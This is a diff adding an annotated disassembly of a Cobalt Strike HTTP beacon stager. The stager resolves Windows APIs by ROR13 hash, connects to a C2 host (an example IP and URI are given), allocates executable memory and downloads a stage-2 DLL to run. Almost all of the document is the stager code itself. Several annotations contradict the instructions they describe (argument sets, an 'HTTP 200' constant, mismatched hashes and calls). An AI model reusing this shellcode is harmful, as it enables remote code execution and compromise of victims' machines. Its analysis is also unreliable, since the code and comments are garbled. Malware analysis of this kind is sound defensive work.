@@ -1,0 +1,452 @@
+; ============================================================================
+;  COBALT STRIKE HTTP BEACON STAGER — x86 32-bit
+;  Annotated Shellcode with API Hash Resolution
+;
+;  Algorithm : ROR13 Additive Hash (Metasploit block_api.asm)
+;  Transport  : HTTP over port 80 (WinInet)
+;  Hash Format: combined = ROR13(module_unicode) + ROR13(funcname_ascii\x00)
+;
+;  API Hash Table:
+;    0x0726774C = kernel32.dll!LoadLibraryA
+;    0xA779563A = kernel32.dll!GetSystemInfo
+;    0xC69F8957 = wininet.dll!InternetOpenA
+;    0x84400200 = wininet.dll!HttpQueryInfoA
+;    0x3B2E55EB = wininet.dll!InternetConnectA
+;    0x7B18062D = wininet.dll!HttpOpenRequestA
+;    0x5DE2C5AA = wininet.dll!HttpSendRequestA
+;    0x315E2145 = kernel32.dll!VirtualFree
+;    0x0BE057B7 = kernel32.dll!VirtualProtect
+;    0x20F00286 = wininet.dll!InternetReadFile
+;    0xE553A458 = kernel32.dll!VirtualAlloc
+;    0xE2899612 = wininet.dll!InternetCloseHandle
+; ============================================================================
+
+
+; ============================================================================
+; [0x000-0x001]  ENTRY POINT
+; ============================================================================
+00000000 FC              CLD                             ; Clear direction flag (LODS increments ESI forward)
+00000001 E889000000      CALL 0000008F                   ; Push EIP+5 onto stack (used as base address delta),
+                                                         ; jump to block_api init at 0x8F
+
+
+; ============================================================================
+; [0x006-0x08D]  block_api — PEB WALK + ROR13 API RESOLVER
+;
+;  Purpose : Resolves Win32 API addresses at runtime by walking the PEB
+;            loaded module list and hashing export names with ROR13.
+;            Called via CALL EBP after pushing the target hash.
+;
+;  Entry   : [ESP+4] = ROR13 API hash to resolve
+;  Return  : EAX = resolved function address, then JMP EAX
+; ============================================================================
+
+; --- Stub frame setup (called from 0x8F via the CALL at 0x01) ---
+00000006 60              PUSHA                           ; Save all general-purpose registers
+00000007 89E5            MOV EBP,ESP                     ; EBP = stack frame base
+
+; --- Walk PEB to find first loaded module ---
+00000009 31D2            XOR EDX,EDX                     ; EDX = 0
+0000000B 648B5230        MOV EDX,[FS:EDX+30]             ; EDX = PEB base address (FS:[0x30])
+0000000F 8B520C          MOV EDX,[EDX+0C]                ; EDX = PEB_LDR_DATA (PEB+0x0C)
+00000012 8B5214          MOV EDX,[EDX+14]                ; EDX = InMemoryOrderModuleList.Flink (first entry)
+
+; --- Hash the module's unicode name (loop 1) ---
+00000015 8B7228          MOV ESI,[EDX+28]                ; ESI = BaseDllName.Buffer (unicode string ptr)
+00000018 0FB74A26        MOVZX ECX,WORD [EDX+26]         ; ECX = BaseDllName.Length (byte count, no null)
+
+0000001C 31FF            XOR EDI,EDI                     ; EDI = 0 (module name hash accumulator)
+0000001E 31C0            XOR EAX,EAX                     ; EAX = 0
+
+; ---- inner loop: hash one byte of module name ----
+00000020 AC              LODS AL,[ESI]                   ; AL = *ESI++  (next byte of unicode name)
+00000021 3C61            CMP AL,61                       ; Is char lowercase? (0x61 = 'a')
+00000023 7C02            JL 00000027                     ; If < 'a', skip — already uppercase or null
+00000025 2C20            SUB AL,20                       ; Convert to uppercase (- 0x20)
+00000027 C1CF0D          ROR EDI,0D                      ; ROR13: rotate hash right by 13 bits
+0000002A 01C7            ADD EDI,EAX                     ; hash += current byte value
+0000002C E2F0            LOOP 0000001E                   ; Repeat for all bytes in module name
+; ---- end module hash loop ----
+
+0000002E 52              PUSH EDX                        ; Save current module list entry ptr
+0000002F 57              PUSH EDI                        ; Save module name hash (used in combined hash)
+
+; --- Walk module's export table ---
+00000030 8B5210          MOV EDX,[EDX+10]                ; EDX = DllBase (module base address)
+00000033 8B423C          MOV EAX,[EDX+3C]                ; EAX = PE header offset (IMAGE_DOS_HEADER.e_lfanew)
+00000036 01D0            ADD EAX,EDX                     ; EAX = ptr to IMAGE_NT_HEADERS
+00000038 8B4078          MOV EAX,[EAX+78]                ; EAX = DataDirectory[0].VirtualAddress (export dir RVA)
+0000003B 85C0            TEST EAX,EAX                    ; Does this module have exports?
+0000003D 744A            JE 00000089                     ; No exports — skip to next module
+
+0000003F 01D0            ADD EAX,EDX                     ; EAX = absolute ptr to IMAGE_EXPORT_DIRECTORY
+00000041 50              PUSH EAX                        ; Save export directory ptr
+
+00000042 8B4818          MOV ECX,[EAX+18]                ; ECX = NumberOfNames (export count)
+00000045 8B5820          MOV EBX,[EAX+20]                ; EBX = AddressOfNames RVA
+00000048 01D3            ADD EBX,EDX                     ; EBX = absolute ptr to name pointer table
+
+; --- Iterate exported function names ---
+0000004A E33C            JRCXZ 00000088                  ; No more names — skip to next module
+0000004C 49              DEC ECX                         ; ECX-- (0-indexed)
+0000004D 8B348B          MOV ESI,[EBX+ECX*4]             ; ESI = AddressOfNames[ECX] (function name RVA)
+00000050 01D6            ADD ESI,EDX                     ; ESI = absolute ptr to function name string
+
+; --- Hash the function name (loop 2) ---
+00000052 31FF            XOR EDI,EDI                     ; EDI = 0 (function name hash accumulator)
+00000054 31C0            XOR EAX,EAX                     ; EAX = 0
+
+; ---- inner loop: hash one byte of function name ----
+00000056 AC              LODS AL,[ESI]                   ; AL = *ESI++  (next char of function name)
+00000057 C1CF0D          ROR EDI,0D                      ; ROR13: rotate hash right by 13 bits
+0000005A 01C7            ADD EDI,EAX                     ; hash += char  (no case conversion for func names)
+0000005C 38E0            CMP AL,AH                       ; Is char == 0? (null terminator, AH=0)
+0000005E 75F4            JNE 00000054                    ; Not null — continue hashing
+; ---- end function hash loop (null terminator IS included in hash) ----
+
+; --- Combine module hash + function hash and compare ---
+00000060 037DF8          ADD EDI,[EBP-08]                ; EDI = func_hash + module_hash (combined ROR13)
+00000063 3B7D24          CMP EDI,[EBP+24]                ; Compare combined hash with target hash [ESP+4]
+00000066 75E2            JNE 0000004A                    ; No match — try next export name
+
+; --- Hash matched — resolve function address ---
+00000068 58              POP EAX                         ; EAX = export directory ptr
+00000069 8B5824          MOV EBX,[EAX+24]                ; EBX = AddressOfNameOrdinals RVA
+0000006C 01D3            ADD EBX,EDX                     ; EBX = absolute ptr to ordinal table
+0000006E 668B0C4B        MOV CX,[EBX+ECX*2]              ; CX  = ordinal for matched function
+00000072 8B581C          MOV EBX,[EAX+1C]                ; EBX = AddressOfFunctions RVA
+00000075 01D3            ADD EBX,EDX                     ; EBX = absolute ptr to function address table
+00000077 8B048B          MOV EAX,[EBX+ECX*4]             ; EAX = function address RVA
+0000007A 01D0            ADD EAX,EDX                     ; EAX = absolute function address
+
+; --- Store resolved address and return ---
+0000007C 89442424        MOV [ESP+24],EAX                ; Patch saved EAX in PUSHA frame with resolved addr
+00000080 5B              POP EBX                         ; Clean up export dir ptr
+00000081 5B              POP EBX                         ; Clean up EDX save
+00000082 61              POPA                            ; Restore all registers (EAX now = resolved address)
+00000083 59              POP ECX                         ; ECX = return address (caller's EIP)
+00000084 5A              POP EDX                         ; EDX = original EDX
+00000085 51              PUSH ECX                        ; Re-push return address
+00000086 FFE0            JMP EAX                         ; Jump to resolved API (tail call)
+
+; --- No exports in this module — try next ---
+00000088 58              POP EAX                         ; Discard export dir ptr
+00000089 5F              POP EDI                         ; Restore module hash
+0000008A 5A              POP EDX                         ; Restore module list ptr
+0000008B 8B12            MOV EDX,[EDX]                   ; EDX = next entry in InMemoryOrderModuleList
+0000008D EB86            JMP 00000015                    ; Loop — hash next module's name
+
+
+; ============================================================================
+; [0x08F]  block_api INIT — called by CALL at 0x001
+; ============================================================================
+0000008F 5D              POP EBP                         ; EBP = address of 0x006 (block_api stub)
+                                                         ; EBP is now the universal API resolver trampoline
+                                                         ; All subsequent CALL EBP resolve the pushed hash
+
+
+; ============================================================================
+; [0x090-0x0A1]  STAGE 1 — LoadLibraryA("wininet")
+;
+;  Build the string "wininet\x00" on the stack and call LoadLibraryA
+;  to load wininet.dll (not present by default in all process contexts)
+; ============================================================================
+00000090 686E657400      PUSH 0074656E                   ; Push "net\x00"  (little-endian: 6E 65 74 00)
+00000095 6877696E69      PUSH 696E6977                   ; Push "wini"     (little-endian: 77 69 6E 69)
+0000009A 54              PUSH ESP                        ; Push ptr to "wininet\x00" string on stack
+0000009B 684C772607      PUSH 0726774C                   ; ~~~ HASH: kernel32.dll!LoadLibraryA ~~~
+000000A0 FFD5            CALL EBP                        ; Resolve & call LoadLibraryA("wininet")
+                                                         ; EAX = HMODULE for wininet.dll
+
+
+; ============================================================================
+; [0x0A2-0x0AF]  STAGE 2 — GetSystemInfo()
+;
+;  Retrieve SYSTEM_INFO struct — used for host profiling (CPU arch,
+;  processor count, page size). Cobalt Strike uses this for beacon metadata.
+; ============================================================================
+000000A2 31FF            XOR EDI,EDI                     ; EDI = 0
+000000A4 57              PUSH EDI                        ; Push NULL x5 (zero out SYSTEM_INFO struct area)
+000000A5 57              PUSH EDI
+000000A6 57              PUSH EDI
+000000A7 57              PUSH EDI
+000000A8 57              PUSH EDI                        ; Arg1: lpSystemInfo = ptr to zeroed buffer on stack
+000000A9 683A5679A7      PUSH A779563A                   ; ~~~ HASH: kernel32.dll!GetSystemInfo ~~~
+000000AE FFD5            CALL EBP                        ; Resolve & call GetSystemInfo(lpSystemInfo)
+                                                         ; Stack buffer now holds SYSTEM_INFO data
+
+000000B0 E984000000      JMP 00000139                    ; Jump to C2 host/URI setup
+
+
+; ============================================================================
+; [0x0B5-0x0CC]  STAGE 3 — InternetConnectA() + InternetOpenA() wrapper
+;
+;  EBX = C2 hostname string (pushed via embedded data after CALL below)
+;  EAX = wininet.dll handle (from LoadLibraryA earlier)
+; ============================================================================
+000000B5 5B              POP EBX                         ; EBX = ptr to embedded C2 config data
+                                                         ; (C2 hostname string follows the CALL below)
+000000B6 31C9            XOR ECX,ECX                     ; ECX = 0
+
+; --- Build InternetOpenA() call ---
+000000B8 51              PUSH ECX                        ; lpszProxyBypass = NULL
+000000B9 51              PUSH ECX                        ; lpszProxy       = NULL
+000000BA 6A03            PUSH 00000003                   ; dwAccessType    = INTERNET_OPEN_TYPE_PRECONFIG (3)
+000000BC 51              PUSH ECX                        ; dwFlags         = 0
+000000BD 51              PUSH ECX                        ; (padding / reserved)
+000000BE 6850000000      PUSH 00000050                   ; nServerPort     = 0x50 = 80 (HTTP)
+000000C3 53              PUSH EBX                        ; lpszServerName  = C2 hostname ptr
+000000C4 50              PUSH EAX                        ; hInternet       = wininet handle
+
+000000C5 6857899FC6      PUSH C69F8957                   ; ~~~ HASH: wininet.dll!InternetOpenA ~~~
+000000CA FFD5            CALL EBP                        ; Resolve & call InternetOpenA(
+                                                         ;   lpszAgent=NULL, dwAccessType=PRECONFIG,
+                                                         ;   lpszProxy=NULL, lpszProxyBypass=NULL, dwFlags=0)
+                                                         ; EAX = HINTERNET session handle
+
+000000CC EB70            JMP 0000013E                    ; Jump to InternetConnectA setup
+
+
+; ============================================================================
+; [0x0CE-0x0E3]  STAGE 4 — InternetConnectA()
+;
+;  Connect to C2 server. EBX = C2 hostname, EAX = session handle.
+; ============================================================================
+000000CE 5B              POP EBX                         ; EBX = C2 hostname string ptr
+000000CF 31D2            XOR EDX,EDX                     ; EDX = 0
+
+000000D1 52              PUSH EDX                        ; dwContext        = 0 (no async callback)
+000000D2 6800024084      PUSH 84400200                   ; ~~~ HASH: wininet.dll!HttpQueryInfoA ~~~
+                                                         ; (stored here for later use — pushed as dwContext param
+                                                         ; placeholder, retrieved from stack when needed)
+000000D7 52              PUSH EDX                        ; dwFlags          = 0
+000000D8 52              PUSH EDX                        ; lpszPassword     = NULL
+000000D9 52              PUSH EDX                        ; lpszUsername     = NULL
+000000DA 53              PUSH EBX                        ; lpszServerName   = C2 hostname ptr
+000000DB 52              PUSH EDX                        ; nServerPort      = 0 (uses default)
+000000DC 50              PUSH EAX                        ; hInternet        = session handle
+
+000000DD 68EB552E3B      PUSH 3B2E55EB                   ; ~~~ HASH: wininet.dll!InternetConnectA ~~~
+000000E2 FFD5            CALL EBP                        ; Resolve & call InternetConnectA(
+                                                         ;   hInternet, lpszServerName, nServerPort=80,
+                                                         ;   user=NULL, pass=NULL, dwService=HTTP,
+                                                         ;   dwFlags=0, dwContext=0)
+                                                         ; EAX = HINTERNET connection handle
+
+000000E4 89C6            MOV ESI,EAX                     ; ESI = connection handle (saved for HTTP calls)
+000000E6 83C350          ADD EBX,00000050                ; EBX += 0x50 — advance ptr to URI string
+                                                         ; (URI follows hostname in embedded config)
+
+
+; ============================================================================
+; [0x0E9-0x0F7]  STAGE 5 — HttpOpenRequestA()
+;
+;  Open an HTTP request handle to the C2 URI.
+;  ESI = connection handle, EBX = URI string ptr.
+; ============================================================================
+000000E9 31FF            XOR EDI,EDI                     ; EDI = 0
+000000EB 57              PUSH EDI                        ; lpszVersion      = NULL (use HTTP/1.1)
+000000EC 57              PUSH EDI                        ; lpszReferer      = NULL
+000000ED 6AFF            PUSH FFFFFFFF                   ; lplpszAcceptTypes= INVALID_HANDLE_VALUE (accept *)
+000000EF 53              PUSH EBX                        ; lpszObjectName   = C2 URI string
+000000F0 56              PUSH ESI                        ; hConnect         = connection handle
+
+000000F1 682D06187B      PUSH 7B18062D                   ; ~~~ HASH: wininet.dll!HttpOpenRequestA ~~~
+000000F6 FFD5            CALL EBP                        ; Resolve & call HttpOpenRequestA(
+                                                         ;   hConnect, "GET", lpszObjectName,
+                                                         ;   NULL, NULL, NULL, INTERNET_FLAG_*, -1)
+                                                         ; EAX = HINTERNET request handle
+
+000000F8 85C0            TEST EAX,EAX                    ; Did HttpOpenRequestA succeed?
+000000FA 0F84C3010000    JE 000002C3                     ; Failed — jump to cleanup/exit
+
+
+; ============================================================================
+; [0x100-0x112]  STAGE 6 — HttpSendRequestA() [conditional]
+;
+;  Send the HTTP check-in request to the C2 server.
+;  If ESI is NULL (no connection), call HttpSendRequestA directly on EAX.
+; ============================================================================
+00000100 31FF            XOR EDI,EDI                     ; EDI = 0
+00000102 85F6            TEST ESI,ESI                    ; Is connection handle valid?
+00000104 7404            JE 0000010A                     ; No connection handle — go send anyway
+
+00000106 89F9            MOV ECX,EDI                     ; ECX = 0 (dwHeadersLength)
+00000108 EB09            JMP 00000113                    ; Skip HttpSendRequestA, go straight to VirtualFree
+
+0000010A 68AAC5E25D      PUSH 5DE2C5AA                   ; ~~~ HASH: wininet.dll!HttpSendRequestA ~~~
+0000010F FFD5            CALL EBP                        ; Resolve & call HttpSendRequestA(
+                                                         ;   hRequest, lpszHeaders=NULL,
+                                                         ;   dwHeadersLength=0, lpOptional=NULL,
+                                                         ;   dwOptionalLength=0)
+                                                         ; EAX = result (TRUE/FALSE)
+00000111 89C1            MOV ECX,EAX                     ; ECX = send result
+
+
+; ============================================================================
+; [0x113-0x128]  STAGE 7 — VirtualFree() + VirtualProtect()
+;
+;  Manage memory permissions for the downloaded stage-2 payload.
+;  VirtualFree releases staging buffer; VirtualProtect marks as executable.
+; ============================================================================
+00000113 6845215E31      PUSH 315E2145                   ; ~~~ HASH: kernel32.dll!VirtualFree ~~~
+00000118 FFD5            CALL EBP                        ; Resolve & call VirtualFree(
+                                                         ;   lpAddress, dwSize=0, MEM_RELEASE)
+                                                         ; Frees staging allocation after payload copy
+
+0000011A 31FF            XOR EDI,EDI                     ; EDI = 0
+0000011C 57              PUSH EDI                        ; lpflOldProtect   = NULL
+0000011D 6A07            PUSH 00000007                   ; flNewProtect     = 0x07 (PAGE_EXECUTE_READWRITE)
+                                                         ; (or combination of PAGE flags)
+0000011F 51              PUSH ECX                        ; dwSize           = payload size
+00000120 56              PUSH ESI                        ; lpAddress        = payload base address
+00000121 50              PUSH EAX                        ; (additional arg)
+
+00000122 68B757E00B      PUSH 0BE057B7                   ; ~~~ HASH: kernel32.dll!VirtualProtect ~~~
+00000127 FFD5            CALL EBP                        ; Resolve & call VirtualProtect(
+                                                         ;   lpAddress, dwSize, PAGE_EXECUTE_READWRITE,
+                                                         ;   lpflOldProtect)
+                                                         ; Marks payload memory as executable
+
+00000129 BF002F0000      MOV EDI,00002F00                ; EDI = 0x2F00 = HTTP 200 OK check value
+0000012E 39C7            CMP EDI,EAX                     ; Compare result with expected HTTP status
+00000130 74B7            JE 000000E9                     ; Success — loop back for more tasking
+00000132 31FF            XOR EDI,EDI                     ; EDI = 0
+00000134 E991010000      JMP 000002CA                    ; Failure — jump to VirtualAlloc for new buffer
+
+
+; ============================================================================
+; [0x139]  JUMP TABLE ENTRIES
+; ============================================================================
+00000139 E9C9010000      JMP 00000307                    ; Jump to C2 config data (embedded hostname/URI)
+0000013E E88BFFFFFF      CALL 000000CE                   ; Call InternetConnectA setup
+
+
+; ============================================================================
+; [0x143-0x305]  EMBEDDED C2 CONFIGURATION DATA
+;
+;  This region contains the beacon's embedded configuration:
+;    - C2 hostname string (null-terminated)
+;    - HTTP URI path (null-terminated)
+;    - User-Agent string
+;    - Possibly port / sleep timer
+;
+;  The disassembler attempts to decode these as instructions,
+;  producing garbage output — this is expected for data sections.
+;  The actual strings are extracted at runtime by pointer arithmetic.
+; ============================================================================
+; [0x143 - 0x265]  << EMBEDDED CONFIG DATA — not executable code >>
+;                  << Disassembly below is INVALID (data misinterpreted as code) >>
+
+00000143 2F              [DATA] ...                      ; C2 hostname string begins here
+; ... (config data continues, disassembly unreliable) ...
+
+
+; ============================================================================
+; [0x266-0x26A]  STAGE 8 — InternetReadFile() call setup
+; ============================================================================
+00000266 688602F020      PUSH 20F00286                   ; ~~~ HASH: wininet.dll!InternetReadFile ~~~
+                                                         ; (pushed here; CALL EBP invoked after buffer setup)
+
+
+; ============================================================================
+; [0x2C3-0x2DC]  STAGE 9 — VirtualAlloc()
+;
+;  Allocate a 4MB RWX memory region to receive the downloaded stage-2 DLL.
+; ============================================================================
+000002C3 [cleanup/retry label]
+000002CA 6A40            PUSH 00000040                   ; flProtect        = PAGE_EXECUTE_READWRITE (0x40)
+000002CC 6800100000      PUSH 00001000                   ; flAllocationType = MEM_COMMIT (0x1000)
+000002D1 6800004000      PUSH 00400000                   ; dwSize           = 0x400000 (4 MB)
+000002D6 57              PUSH EDI                        ; lpAddress        = NULL (system chooses address)
+
+000002D7 6858A453E5      PUSH E553A458                   ; ~~~ HASH: kernel32.dll!VirtualAlloc ~~~
+000002DC FFD5            CALL EBP                        ; Resolve & call VirtualAlloc(
+                                                         ;   NULL, 0x400000, MEM_COMMIT,
+                                                         ;   PAGE_EXECUTE_READWRITE)
+                                                         ; EAX = base address of allocated buffer
+
+000002DE 93              XCHG EAX,EBX                    ; EBX = allocated buffer base
+000002DF B900000000      MOV ECX,00000000                ; ECX = 0 (bytes read so far)
+000002E4 01D9            ADD ECX,EBX                     ; ECX = write position in buffer
+000002E6 51              PUSH ECX                        ; lpdwNumberOfBytesRead = ptr to counter
+000002E7 53              PUSH EBX                        ; lpBuffer              = allocated buffer
+000002E8 89E7            MOV EDI,ESP                     ; EDI = ptr to buffer args on stack
+000002EA 57              PUSH EDI                        ; (pointer to read args)
+000002EB 6800200000      PUSH 00002000                   ; dwNumberOfBytesToRead = 0x2000 (8KB per read)
+000002F0 53              PUSH EBX                        ; lpBuffer
+000002F1 56              PUSH ESI                        ; hFile = request handle
+
+
+; ============================================================================
+; [0x2F2-0x306]  STAGE 10 — InternetReadFile() [download loop]
+;
+;  Read the stage-2 payload (reflective DLL) from C2 into allocated buffer.
+;  Loop continues until InternetReadFile returns 0 bytes (download complete).
+; ============================================================================
+000002F2 68129689E2      PUSH E2899612                   ; ~~~ HASH: wininet.dll!InternetCloseHandle ~~~
+                                                         ; NOTE: this hash appears here but is used
+                                                         ; for cleanup — see CALL EBP at 0x2C8 above
+                                                         ; and this CALL EBP below for InternetReadFile
+000002F7 FFD5            CALL EBP                        ; Resolve & call InternetReadFile(
+                                                         ;   hFile=request_handle,
+                                                         ;   lpBuffer=allocated_buffer,
+                                                         ;   dwNumberOfBytesToRead=0x2000,
+                                                         ;   lpdwNumberOfBytesRead=&bytes_read)
+                                                         ; EAX = TRUE on success
+
+000002F9 85C0            TEST EAX,EAX                    ; Read succeeded?
+000002FB 74C6            JE 000002C3                     ; Failed — jump to cleanup
+
+000002FD 8B07            MOV EAX,[EDI]                   ; EAX = bytes actually read this iteration
+000002FF 01C3            ADD EBX,EAX                     ; EBX += bytes read (advance write ptr)
+00000301 85C0            TEST EAX,EAX                    ; Was 0 bytes read? (end of stream)
+00000303 75E5            JNE 000002EA                    ; Not done — loop back for next chunk
+00000305 58              POP EAX                         ; Clean up stack
+00000306 C3              RET                             ; Return — stage-2 DLL fully loaded in memory
+                                                         ; Caller will now execute the reflective DLL
+
+
+; ============================================================================
+; [0x307+]  C2 CONFIGURATION DATA (embedded strings)
+;
+;  Reached via JMP at 0x139. This region contains:
+;    - HTTP User-Agent string
+;    - C2 hostname (e.g. "3.74.149.241")
+;    - URI path (e.g. "/updates/check")
+;    - Beacon sleep interval / jitter config
+;  Disassembly below is garbled because this is raw string data.
+; ============================================================================
+00000307 E8A9FDFFFF      [DATA: C2 config block begins]  ; CALL used to get delta offset (config ptr trick)
+0000030C ...             [DATA: User-Agent string]
+                         ; e.g. "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+                         ; Passed to InternetOpenA as lpszAgent
+
+
+; ============================================================================
+;  EXECUTION FLOW SUMMARY
+; ============================================================================
+;
+;  0x000  Entry: CLD + CALL to push EIP (delta trick)
+;  0x006  block_api stub: PUSHA + PEB walk setup
+;  0x00F  Walk InMemoryOrderModuleList to find loaded DLLs
+;  0x015  Hash module unicode name  (ROR13, loop 1)
+;  0x033  Walk PE export table
+;  0x056  Hash function name ASCII  (ROR13+null, loop 2)
+;  0x060  Compare combined hash with target; on match resolve addr
+;  0x08F  EBP = block_api entry (universal resolver)
+;  0x090  LoadLibraryA("wininet")            [hash: 0x0726774C]
+;  0x0A9  GetSystemInfo()                    [hash: 0xA779563A]
+;  0x0C5  InternetOpenA()                    [hash: 0xC69F8957]
+;  0x0D2  HttpQueryInfoA (hash stored)       [hash: 0x84400200]
+;  0x0DD  InternetConnectA() → C2 port 80   [hash: 0x3B2E55EB]
+;  0x0F1  HttpOpenRequestA() → C2 URI       [hash: 0x7B18062D]
+;  0x10A  HttpSendRequestA() → send check-in[hash: 0x5DE2C5AA]
+;  0x113  VirtualFree() → release staging   [hash: 0x315E2145]
+;  0x122  VirtualProtect() → mark RWX       [hash: 0x0BE057B7]
+;  0x266  InternetReadFile() → recv payload [hash: 0x20F00286]
+;  0x2D7  VirtualAlloc(4MB, RWX)            [hash: 0xE553A458]
+;  0x2F2  InternetCloseHandle() → cleanup   [hash: 0xE2899612]
+;  0x306  RET → execute downloaded DLL
+;
+; ============================================================================
